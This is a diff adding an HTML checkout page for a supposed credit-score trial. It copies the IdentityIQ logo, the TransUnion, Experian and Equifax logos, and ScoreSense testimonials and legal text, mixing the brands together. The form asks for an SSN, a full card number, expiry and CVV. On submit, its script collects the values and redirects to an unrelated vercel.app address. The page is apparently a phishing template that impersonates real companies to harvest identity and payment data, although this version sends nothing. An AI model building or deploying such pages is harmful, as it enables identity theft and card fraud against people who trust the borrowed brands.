@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Credit Score Meter</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f8;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 42px;
+            font-weight: 600;
+            color: rgba(34, 34, 34, 1);
+            text-align: center;
+            margin: 0;
+        }
+
+        p {
+            font-family: 'Crimson Text', serif;
+            font-size: 20px;
+            text-align: justify;
+            margin: 20px 0;
+            max-width: 600px;
+        }
+
+        .container {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            padding: 50px;
+            gap: 40px;
+        }
+
+        /* Banner Image */
+        .banner {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .banner img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Form Container */
+        .form-container {
+            background: rgba(246, 156, 7, 0.1); /* Subtle background for the form */
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 100%;
+        }
+
+        label {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 16px;
+            font-weight: bold;
+            color: rgba(34, 34, 34, 1);
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(34, 34, 34, 0.2);
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus,
+        select:focus {
+            border-color: rgba(246, 156, 7, 1);
+            outline: none;
+        }
+
+        .btn {
+            display: inline-block;
+            text-align: center;
+            background: rgba(246, 156, 7, 0.75);
+            color: rgba(255, 255, 255, 1);
+            font-family: 'Montserrat', sans-serif;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 15px 90px;
+            border-radius: 100px;
+            border: 3px solid rgba(1, 77, 130, 1);
+            text-decoration: none;
+            transition: all 0.3s ease-in-out;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background: rgba(246, 156, 7, 1);
+        }
+
+        /* Order Summary Box */
+        .order-summary {
+            position: sticky;
+            top: 20px;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 20px;
+            width: 300px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .order-summary h3 {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0 0 15px;
+        }
+
+        .order-summary p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+
+        .order-summary strong {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .order-summary a {
+            color: blue;
+            text-decoration: underline;
+        }
+
+        .order-summary .total-due {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        @media only screen and (max-width: 800px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .form-container {
+                padding: 20px;
+            }
+
+            .btn {
+                padding: 10px 20px;
+                font-size: 16px;
+            }
+
+            .order-summary {
+                position: static;
+                width: 100%;
+                margin-top: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Image -->
+    <div class="banner">
+        <img src="https://member.identityiq.com/WebResources/BusinessLogo/2023-01-27T202510.287Z.png " alt="IdentityIQ Logo">
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Order Placement Form -->
+        <div class="form-container">
+            <form id="orderForm">
+                <!-- Title, First Name, Last Name -->
+                <label for="title">Title</label>
+                <select id="title" name="title" required>
+                    <option value="" disabled selected>Select Title</option>
+                    <option value="mr">Mr.</option>
+                    <option value="mrs">Mrs.</option>
+                    <option value="miss">Miss</option>
+                    <option value="ms">Ms.</option>
+                </select>
+
+                <label for="firstName">First Name</label>
+                <input type="text" id="firstName" name="firstName" placeholder="Enter your first name" required>
+
+                <label for="lastName">Last Name</label>
+                <input type="text" id="lastName" name="lastName" placeholder="Enter your last name" required>
+
+                <!-- Email and Phone Number -->
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="example@example.com" required>
+
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+
+                <!-- SSN -->
+                <label for="ssn">SSN</label>
+                <input type="text" id="ssn" name="ssn" placeholder="Enter your SSN">
+
+                <!-- Address -->
+                <label for="address">Complete Address</label>
+                <input type="text" id="address" name="address" placeholder="Street Address" required>
+                <input type="text" id="city" name="city" placeholder="City" required>
+                <input type="text" id="zip" name="zip" placeholder="Post Code / ZIP Code" required>
+
+                <!-- Payment Details -->
+                <label>Payment Information</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" required>
+                <div style="display: flex; gap: 15px;">
+                    <input type="text" id="expiry" name="expiry" placeholder="Expiry (MM/YY)" required>
+                    <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn">Submit Order</button>
+            </form>
+        </div>
+
+        <!-- Order Summary Box -->
+        <aside class="order-summary">
+            <h3>Order Summary</h3>
+            <p><strong>CreditScoreIQ Trial</strong></p>
+            <p><strong>7 Days Trial for $0.00</strong></p>
+            <p><strong>Then $3.99/mo</strong></p>
+            <ul style="padding: 0; list-style: none;">
+                <li>3 Bureau Credit Report & Scores</li>
+                <li><a href="#">ScoreCasterIQ</a></li>
+                <li><u>Enhanced Credit Monitoring</u></li>
+            </ul>
+            <p><a href="#">More</a></p>
+            <p class="total-due"><strong>Total Due: $0.00</strong></p>
+        </aside>
+    </div>
+
+    <!-- Credit Bureau Logos -->
+    <div class="bureau-logos">
+        <img src="https://d1yei2z3i6k35z.cloudfront.net/8936402/66b5042fa874d_366-3666850_transunion-logo-png-transparent-png.png " alt="TransUnion Logo">
+        <img src="https://d1yei2z3i6k35z.cloudfront.net/8936402/66b5043f0f704_Experian-Logo.wine.png " alt="Experian Logo">
+        <img src="https://d1yei2z3i6k35z.cloudfront.net/8936402/66b5044e53fc5_equifax-logo-vector.svg " alt="Equifax Logo">
+    </div>
+
+    <!-- Testimonials Section -->
+    <div class="testimonials">
+        <h2>What Our Customers Say About ScoreSense</h2>
+        <div class="testimonial-card-container">
+            <!-- Tina Testimonial -->
+            <div class="testimonial-card">
+                <div class="testimonial-avatar">
+                    <img src="https://www.freescoreonline.com/welcome/5v/images/tina-w/tina-w_w122xh122.png " alt="Tina" />
+                </div>
+                <p class="testimonial-name">Tina</p>
+                <div class="testimonial-rating">
+                    <span class="testimonial-stars">⭐⭐⭐⭐</span>
+                    <span class="verified-badge">Verified Purchase</span>
+                </div>
+                <p class="testimonial-review"><b>Great</b><br />Kept up to date. Very informative and helpful! Notified me if something might be wrong or different!</p>
+            </div>
+
+            <!-- George Testimonial -->
+            <div class="testimonial-card">
+                <div class="testimonial-avatar">
+                    <img src="https://www.freescoreonline.com/welcome/5v/images/george-w/george-w_w122xh122.png " alt="George" />
+                </div>
+                <p class="testimonial-name">George</p>
+                <div class="testimonial-rating">
+                    <span class="testimonial-stars">⭐⭐⭐⭐</span>
+                    <span class="verified-badge">Verified Purchase</span>
+                </div>
+                <p class="testimonial-review"><b>Recommended</b><br />Scoresense is the best site I've seen for viewing credit scores. I will be recommending them to my friends. Thanks.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- FAQ Section -->
+    <div class="faq-section">
+        <div class="faq-title">You have questions, we have answers.</div>
+        <div class="faq-item">
+            <div class="faq-question" onclick="toggleAnswer(this)">
+                What’s a credit report?
+                <button class="faq-button">+</button>
+            </div>
+            <div class="faq-answer">
+                Your credit report is a record of your financial history. It includes credit inquiries, open and closed credit accounts, your payment history and bankruptcies (if applicable). It also contains personal information such as your current and former address(es), names and employers. All this information is part of your data identity. By managing it regularly, you can help ensure you’re accurately represented in the modern economy so you can get the credit opportunities you desire.
+            </div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-question" onclick="toggleAnswer(this)">
+                How often is my credit score updated?
+                <button class="faq-button">+</button>
+            </div>
+            <div class="faq-answer">
+                Your credit score is typically updated monthly based on the information provided by the credit bureaus. However, significant changes in your financial activity (such as late payments or new credit accounts) may cause more frequent updates.
+            </div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-question" onclick="toggleAnswer(this)">
+                What factors affect my credit score?
+                <button class="faq-button">+</button>
+            </div>
+            <div class="faq-answer">
+                Several factors affect your credit score, including payment history, credit utilization, length of credit history, types of credit accounts, and recent credit inquiries. Maintaining healthy habits in these areas can improve your score over time.
+            </div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-question" onclick="toggleAnswer(this)">
+                Can I dispute errors on my credit report?
+                <button class="faq-button">+</button>
+            </div>
+            <div class="faq-answer">
+                Yes, you can dispute errors on your credit report. Contact the credit bureau that issued the report and provide supporting documentation to correct any inaccuracies. The process typically takes 30–45 days.
+            </div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-question" onclick="toggleAnswer(this)">
+                Is my credit score the same across all bureaus?
+                <button class="faq-button">+</button>
+            </div>
+            <div class="faq-answer">
+                No, your credit score may vary slightly between the three major credit bureaus (TransUnion, Experian, and Equifax) due to differences in their scoring models and the data they collect. However, the scores are generally close to each other.
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="footer-logo">
+            <img src="https://member.identityiq.com/WebResources/BusinessLogo/2023-01-27T202510.287Z.png " alt="Footer Logo" style="max-width: 100px; height: auto;" />
+        </div>
+        <div class="footer-links">
+            <a href="#">Sign In</a>
+            <a href="#">Contact Us</a>
+            <a href="#">Terms and Conditions</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Do Not Sell or Share My Information</a>
+            <a href="#">Cookie Settings</a>
+        </div>
+        <div class="footer-copyright">
+            © 2001-2025 One Technologies, LLC. All rights reserved.
+        </div>
+        <div class="footer-disclaimer">
+            ScoreSense® is a trademark of One Technologies, LLC.<br />
+            One Technologies, LLC is the proud owner of this website. For a complete list of our properties, <a href="#">click here</a>.<br />
+            *Identity Theft Insurance written by insurance company subsidiaries or affiliates of American International Group, Inc. The description herein is a summary and intended for informational purposes only and does not include all terms, conditions, and exclusions of the policies described. Please refer to the actual policies for terms, conditions, and exclusions of coverage. Coverage may not be available in all jurisdictions.<br />
+            Credit scores and ratings shown above are examples only.<br />
+            After verification of your identity, your scores are available for secure online delivery in seconds.
+        </div>
+    </footer>
+
+    <script>
+        // Redirect to your desired URL
+        document.getElementById('orderForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Optional: Collect form data if you need to use it later
+            const formData = new FormData(this);
+            const formValues = Object.fromEntries(formData);
+
+            // Redirect to your custom URL
+            window.location.href = "https://checking-index-html-purposely.vercel.app/ ";
+        });
+
+        // FAQ Toggle Script
+        function toggleAnswer(element) {
+            const answer = element.nextElementSibling;
+            const button = element.querySelector(".faq-button");
+
+            if (answer.style.display === "block") {
+                answer.style.display = "none";
+                button.textContent = "+"; // Change button back to +
+            } else {
+                answer.style.display = "block";
+                button.textContent = "-"; // Change button to -
+            }
+        }
+    </script>
+</body>
+</html>
